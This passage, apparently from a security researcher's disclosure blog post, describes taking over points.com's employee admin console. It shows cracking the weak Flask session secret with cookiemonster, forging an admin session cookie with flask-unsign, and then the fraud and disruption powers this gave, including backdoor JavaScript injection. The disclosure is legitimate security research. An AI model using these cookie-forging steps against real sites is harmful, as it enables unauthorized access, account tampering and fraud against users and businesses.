<p>We took the cookie and ran it through Ian Carroll's "<a href="https://github.com/iangcarroll/cookiemonster">cookiemonster</a>" tool. This tool would automatically guess secrets used for signing the cookie by attempting to unsign it with a wordlist of known secrets. After a few seconds, we had a response!</p>
<pre><code>zlz@htp ~&gt; cookiemonster -cookie <span>".eJwNyTEOgzAMBdC7eO6QGNskXCZKrG8hgVqJdEPcvX3ru6n5vKJ9PwfetFHCiCqwtYopo4NLiPOo4jYMuhizpJLV8oicilQF_qOeF_a104taXJg7bdHPiecHfX8ccg.ZFCriA.99lOhq3pO8yBWM7XjBshaKjqPKU"</span>
🍪 CookieMonster 1.4.0
ℹ️ CookieMonster loaded the default wordlist; it has 38919 entries.
✅ Success! I discovered the key <span>for</span> this cookie with the flask decoder; it is <span>"secret"</span>.
</code></pre>
<p>The Flask session secret for the website that was used by points.com employees to manage all rewards profiles, loyalty programs, and customer orders, was the word "secret". We could now theoretically sign our own cookie with whatever data we wanted, as long as the server wasn't including some unpredictable or signed piece of data within the cookie. We authenticated to the website and copied our session cookie over to flask-unsign to investigate the contents of the cookie:</p>
<pre><code><span>{</span><span>"_csrf_token"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"_fresh"</span><span>:</span> <span><span>true</span></span><span>,</span> <span>"_id"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"_user_id"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"sid"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"user"</span><span>:</span> <span>{</span><span>"authenticationType"</span><span>:</span> <span>"account"</span><span>,</span> <span>"email"</span><span>:</span> <span>"samwcurry@gmail.com"</span><span>,</span> <span>"feature_flags"</span><span>:</span> <span>[</span><span>"temp_resending_emails"</span><span>]</span><span>,</span> <span>"groups"</span><span>:</span> <span>[</span><span>]</span><span>,</span> <span>"id"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"mac_key"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"mac_key_identifier"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"roles"</span><span>:</span> <span>[</span><span>]</span><span>}</span><span>}</span>
</code></pre>
<p>Based on what we saw in the decrypted body of our cookie, there wasn't anything unpredictable that would stop us from tampering with the cookie. The "roles" and "groups" arrays appeared most fruitful for escalating privileges since we could now re-sign it with any data we wanted, so we went back through the app and attempted to find JavaScript which related to these fields.</p>
<p>The role which looked the most privileged based on the information we found in the JavaScript was the "configeditor" role. We added this to our cookie along with the "admin" group and resigned it using the following command:</p>
<pre><code>flask-unsign -s -S <span>"secret"</span> -c <span>"{'_csrf_token': 'bb2cf0e85b20f13dcfebecb436c91b160f392fa2555961c23b3fcc67775edc50', '_fresh': True, '_id': 'a76abcdda16ed36f131df6e5f30c7e9cf142131ebcd4c0706b4c05ec720006daeaef804fcd925743954f10c8a5b3e10018216585157c88e6aedaa8fb42702dd3', '_user_id': '8547961e-b122-4b42-a124-4169cfc86a94', 'sid': 'bd2e7256bf1011eda2410242ac11000a', 'user': {'authenticationType': 'account', 'email': 'samwcurry@gmail.com', 'feature_flags': ['temp_resending_emails', 'v2_manual_bonus_page', 'v2_request_for_reimbursements'], 'groups': ['admin'], 'id': '8547961e-b122-4b42-a124-4169cfc86a94', 'mac_key': 'blLWTn1VyhIWNPoAVC2X9-Iqsqei7pEPkgXjxnhRepg=', 'mac_key_identifier': '8d261003b476497e8be4c2c077d69b5f', 'roles': [{'role': 'https://lcp.points.com/v1/roles/configeditor'}]}}"</span>
</code></pre>
<p>The command resigned our cookie with the "secret" key and gave us the following cookie:</p>
<pre><code>session=.eJy9U01r3DAU_C8-x1lJ1oe9UOgSegiUsrQhCZRg9PG0665tOZKcdgn5733eHAKFQLeHniw_zcwbzZOei9am6NscDjAW68IYZj2BWhhGPK2c9WDAGl5J21BDJfFVw7xmQohGUssqU3lrpVJKgLOCFBdF6yOkfbHOcQb86xzKaiW1sc5pKsFVEpWp8xKEr4hV0FhPOcMaIIZboog0-BFgFSOESKdBg68J99Y1TCheNYJ7SmythamAEkJrRqWoBRXK1jVIDU7r2hvOFGHOVYutOUF8dVMLrtA9lIYyVnJElZoyXnIq0YqtpW44MtIJbBwDxYQ02JBS1GWcEsaZthQbE43ARblYPxd6znsYc2d17sJ4c5xgObq1YR4zwmDQXY-VpIefdo7x-HEK3ZjTpQ0DbnvQeY7Q-l7vUrH-XmQYphazhNF146490RMCn1g76HHWfWvCOKd20jt4LUd4nCHl1oeI624wc0wwoKVUPFwUuxjm6aR8FcYUetikba8zgoeNG7pxwZyTz6Bte4DjklH_-e5mpLfH_fXdl23Y3F6x-6a8fkyP0Knp0_awu__xa9x_hWn34Y2Iw1jS8t2SXlE7JjHQynAleaOgNsAtw8ugnGyM8MiL6Hnx_3xaIWef85TWq1Vvp8u3LFdPdHWCriJoV4axPxYvF39NeiecMxS2p9pmmr7N0xRiPoerp6lM59P6f2LZOeUwQPx_HQcdD5DxOuOTeeosJBtG3-0gpnNUTAgH1IiwtF-G_Af_vRE-vLz8BnvIpoE.ZFDJgQ.Lld9KeetbZJ_KBeLI2KOHB7EnaA
</code></pre>
<p>After plugging this cookie in, we attempted to revisit the "console.points.com" website and saw a bunch of extra functionality. We were in and had full administrative privileges!</p>
<p>One page that immediately grabbed our attention was "Manual Bonus". After clicking it, we realized that it was capable of manually adding rewards points for any program to any rewards account. Jackpot!</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>We could additionally access the "admin-loyaltywallet.points.com" website after clicking the "Loyalty Platform" sidebar button. This website had additional functionality, allowing us to query users via their name, member ID, or email address, and much much more:</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FWimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FWimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FWimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FWimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FWimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FWimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FWimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FWimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FWimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Other tabs included config and experiment management:</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FvI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FvI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FvI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FvI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FvI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FvI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FvI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FvI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FvI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Another fun bit of impact was the ability to modify the rewards exchange amounts through the Promos tab. We could update rewards programs to offer, for example, 100 million United miles in exchange for 1 Delta mile, or simply 1 million miles for every dollar spent on a particular program. Users would then be able to exchange their miles, giving them nearly unlimited miles.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2Fyk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2Fyk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2Fyk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2Fyk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2Fyk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2Fyk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2Fyk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2Fyk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2Fyk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>For user management, you could view, update, or delete user accounts. It was possible to see all account history, connections, and memberships for the accounts.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2FICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2FICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2FICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2FICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2FICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2FICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2FICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2FICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2FICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Two other interesting pages on the "console.points.com" website were the Modules and Routes endpoints. An attacker could use this as intended to add malicious JavaScript to every page on the administration panel. If undetected, it would make for a super fun backdoor where an attacker's JavaScript would be loaded on every page of the administration website.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2Fz61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2Fz61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2Fz61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2Fz61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2Fz61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2Fz61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2Fz61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2Fz61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2Fz61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Since these were all production rewards customers, an attacker could temporarily shut down all rewards travel by modifying the key pairs used by each airline on the Platform Partners endpoint. Once the MAC ID and MAC key were overwritten, it would break the infrastructure used by airlines to communicate with points.com, meaning customers would be unable to book flights using airline miles.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FdnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FdnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU&amp;w=750&amp;q=75 750w, 